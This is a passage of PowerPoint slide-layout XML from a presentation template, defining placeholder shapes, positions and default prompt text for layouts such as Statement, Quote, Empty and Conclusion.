          <p:cNvPr id="6" name="Graphic 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{BB98C21E-A9AF-D3FB-3F6A-06088553C6F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32576" y="5852160"/>
            <a:ext cx="754380" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Slide Number Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA0528A9-0729-B0FB-328C-3C96994AAB3C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8822095"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00681745"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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tatem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221EB5-8556-FBD7-00D5-D69AC8E7E73A}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="459486" y="-1133856"/>
            <a:ext cx="7989570" cy="1005840"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Graphic 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{832976E3-E745-9DF8-C3E3-53A778D9502E}"/>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22340" y="5852160"/>
            <a:ext cx="754380" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="12" name="Footer Placeholder 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6F777942-A24A-16CB-2115-A16E397BBB01}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="15"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr/>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Date Placeholder 10">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{91D0C3F1-69CA-2A45-33F7-9AF4B8FFEDBC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="14"/>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13" name="Slide Number Placeholder 12">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{8DB65802-3866-05DF-F96B-15A117F7C76C}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="16"/>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7" name="Content Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3E4E45FF-53F3-89B1-B969-C440DC819EF4}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-13102" y="1016759"/>
            <a:ext cx="7562020" cy="5841242"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b" anchorCtr="0">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="4200" b="0" spc="-150" baseline="0"/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="171450" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="4200" b="0" spc="-150" baseline="0"/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="342900" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="4200" b="0" spc="-150" baseline="0"/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="514350" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="4200" b="0" spc="-150" baseline="0"/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="685800" indent="0">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:buNone/>
              <a:defRPr sz="4200" b="0" spc="-150" baseline="0"/>
            </a:lvl5pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to add Statement</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="1"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Second level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="2"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Third level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="3"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Fourth level</a:t>
            </a:r>
          </a:p>
          <a:p>
            <a:pPr lvl="4"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Fifth level</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="3375358666"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="0"/>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p:cSld name="Quote">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:pic>
        <p:nvPicPr>
          <p:cNvPr id="3" name="Graphic 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{5DC095FD-8C32-C2DB-3F1D-105AFD1518B8}"/>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8312510" y="5852160"/>
            <a:ext cx="754380" cy="1005840"/>
          </a:xfrm>
          <a:prstGeom prst="rect">
            <a:avLst/>
          </a:prstGeom>
        </p:spPr>
      </p:pic>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="4" name="Title 1">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{CA0FBB42-F049-CCA6-45E1-D60DC58A76F0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-1" y="5899927"/>
            <a:ext cx="4426993" cy="958073"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:defRPr sz="1500" spc="0" baseline="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mn-lt"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Quote Author</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Content Placeholder 6">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{2B5E50A9-B175-CA38-A22A-468AE7533B54}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="13" hasCustomPrompt="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="-13716" y="95534"/>
            <a:ext cx="6720840" cy="4476466"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:normAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr marL="123444" indent="-123444">
              <a:lnSpc>
                <a:spcPct val="80000"/>
              </a:lnSpc>
              <a:spcBef>
                <a:spcPts val="0"/>
              </a:spcBef>
              <a:buNone/>
              <a:defRPr sz="4200" spc="-150" baseline="0">
                <a:solidFill>
                  <a:schemeClr val="tx1"/>
                </a:solidFill>
                <a:latin typeface="+mj-lt"/>
              </a:defRPr>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US" dirty="0"/>
              <a:t>Click to add Quote</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Slide Number Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{84D7E47A-F89A-8F43-C300-185AD1461C07}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="16"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8822095" y="11036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10" name="Footer Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1CA01B7F-0CDC-9F0A-6B3B-A87674D14D6B}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4644772" y="6392565"/>
            <a:ext cx="2328650" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="b"/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
    </p:spTree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="1672632776"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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1_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2A74F0-5415-CAD7-98B3-4A75913F44B5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="384048" y="987552"/>
            <a:ext cx="2599182" cy="294436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5151E178-0505-15CE-6ACB-7BE1FB1E52EC}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="397765" y="110365"/>
            <a:ext cx="2606040" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Date Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9B82246E-2BFA-5BAA-F22D-A2618C05A0B2}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3236977" y="104577"/>
            <a:ext cx="3627662"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BD4BA02B-433E-FB95-6E96-11393CDBD0CB}"/>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8" name="Content Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{F74B4B98-ABA0-9FD3-485A-984EDEEB4469}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3236975" y="987552"/>
            <a:ext cx="5585119"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9" name="Content Placeholder 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{3822067E-4B47-03C7-3636-0C6F8324E1E9}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="18"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="3236975" y="3931920"/>
            <a:ext cx="5585118" cy="256032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1806855111"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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EF29C1-2D4D-0529-EAD3-926838F41BF8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="384048" y="630936"/>
            <a:ext cx="8263890"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9A6A1D5A-FFC5-5F10-90D2-A3FBCC3129EF}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="397764" y="110365"/>
            <a:ext cx="3957639" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="3" name="Date Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{FE1BD63D-FC9C-D946-5560-869AEDE315EA}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4642867" y="104577"/>
            <a:ext cx="3627662"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822EF08D-93E2-AF7A-F559-DDB0B35B8781}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>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6" name="Text Placeholder 2">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{148CB9E0-8B46-6608-0C37-7C5ABA9B47A8}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" idx="1"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="397764" y="2286001"/>
            <a:ext cx="3888486" cy="534033"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master text styles</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="10" name="Content Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C2C05A59-CCEE-1225-7022-B1DA682C7041}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="17"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="397763" y="2980944"/>
            <a:ext cx="3887391" cy="358611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8" name="Text Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{86471C19-5F51-6595-B72A-4BFC1E553DC0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="body" sz="quarter" idx="3"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4642866" y="2286001"/>
            <a:ext cx="3887391" cy="534033"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:pPr lvl="0"/>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master text styles</a:t>
            </a:r>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="11" name="Content Placeholder 11">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{0AB20C10-A144-EF5E-8276-7E736CE87590}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="18"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4642866" y="2980944"/>
            <a:ext cx="3887391" cy="3586110"/>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Tree>
    <p:extLst>
      <p:ext uri="{BB962C8B-B14F-4D97-AF65-F5344CB8AC3E}">
        <p14:creationId xmlns:p14="http://schemas.microsoft.com/office/powerpoint/2010/main" val="84192248"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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10" name="Title 9">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{6D1F904E-1F4C-373E-2E2B-D7478F70F195}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="title"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="377190" y="644663"/>
            <a:ext cx="8284464" cy="1088358"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>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a:xfrm>
            <a:off x="397764" y="109729"/>
            <a:ext cx="3957639" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRP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a:xfrm>
            <a:off x="8423947" y="11036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3388128073"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="0"/>
</p:sldLayout>
</file>

<file path=ppt/slideLayouts/slideLayout25.xml><?xml version="1.0" encoding="utf-8"?>
<p:sldLayout xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main" xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships" xmlns:p="http://schemas.openxmlformats.org/presentationml/2006/main" type="blank" preserve="1">
  <p:cSld name="Empty">
    <p:spTree>
      <p:nvGrpSpPr>
        <p:cNvPr id="1" name=""/>
        <p:cNvGrpSpPr/>
        <p:nvPr/>
      </p:nvGrpSpPr>
      <p:grpSpPr>
        <a:xfrm>
          <a:off x="0" y="0"/>
          <a:ext cx="0" cy="0"/>
          <a:chOff x="0" y="0"/>
          <a:chExt cx="0" cy="0"/>
        </a:xfrm>
      </p:grpSpPr>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="6" name="Footer Placeholder 4">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{1AD1B27E-1142-7BB8-1DE8-D31FA8AA8F10}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="ftr" sz="quarter" idx="11"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="0" y="100702"/>
            <a:ext cx="4423973" cy="365125"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle/>
          <a:p>
            <a:endParaRPr lang="en-IN">
              <a:solidFill>
                <a:prstClr val="black">
                  <a:tint val="75000"/>
                </a:prstClr>
              </a:solidFill>
            </a:endParaRPr>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="5" name="Date Placeholder 3">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{D900E2BC-FCC7-E994-4648-A42CDE518612}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="dt" sz="half" idx="10"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="4663440" y="100702"/>
            <a:ext cx="3999001"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7" name="Slide Number Placeholder 5">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{9E211A59-CFA8-A0B1-4A4C-E446F90726C5}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph type="sldNum" sz="quarter" idx="12"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="8822095" y="100702"/>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2016307124"/>
      </p:ext>
    </p:extLst>
  </p:cSld>
  <p:clrMapOvr>
    <a:masterClrMapping/>
  </p:clrMapOvr>
  <p:hf hdr="0" ftr="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Conclusion">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409445" y="655094"/>
            <a:ext cx="8236807" cy="1528549"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr anchor="t">
            <a:noAutofit/>
          </a:bodyPr>
          <a:lstStyle>
            <a:lvl1pPr>
              <a:defRPr sz="4200"/>
            </a:lvl1pPr>
          </a:lstStyle>
          <a:p>
            <a:r>
              <a:rPr lang="en-US"/>
              <a:t>Click to edit Master title style</a:t>
            </a:r>
            <a:endParaRPr lang="en-US" dirty="0"/>
          </a:p>
        </p:txBody>
      </p:sp>
      <p:sp>
        <p:nvSpPr>
          <p:cNvPr id="8" name="Content Placeholder 7">
            <a:extLst>
              <a:ext uri="{FF2B5EF4-FFF2-40B4-BE49-F238E27FC236}">
                <a16:creationId xmlns:a16="http://schemas.microsoft.com/office/drawing/2014/main" id="{C7E1FCC9-2D1D-9C6B-8C9A-E3D0A77DBEF0}"/>
              </a:ext>
            </a:extLst>
          </p:cNvPr>
          <p:cNvSpPr>
            <a:spLocks noGrp="1"/>
          </p:cNvSpPr>
          <p:nvPr>
            <p:ph sz="quarter" idx="13"/>
          </p:nvPr>
        </p:nvSpPr>
        <p:spPr>
          <a:xfrm>
            <a:off x="409445" y="2497541"/>
            <a:ext cx="8236807" cy="3384645"/>
          </a:xfrm>
        </p:spPr>
        <p:txBody>
          <a:bodyPr/>
          <a:lstStyle>
            <a:lvl1pPr marL="0" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:lvl1pPr>
            <a:lvl2pPr marL="171450" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:lvl2pPr>
            <a:lvl3pPr marL="342900" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:lvl3pPr>
            <a:lvl4pPr marL="514350" indent="0">
              <a:buNone/>
              <a:defRPr/>
            </a:lvl4pPr>
            <a:lvl5pPr marL="685800" indent="0">
              <a:buNone/>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5">
            <a:extLst>
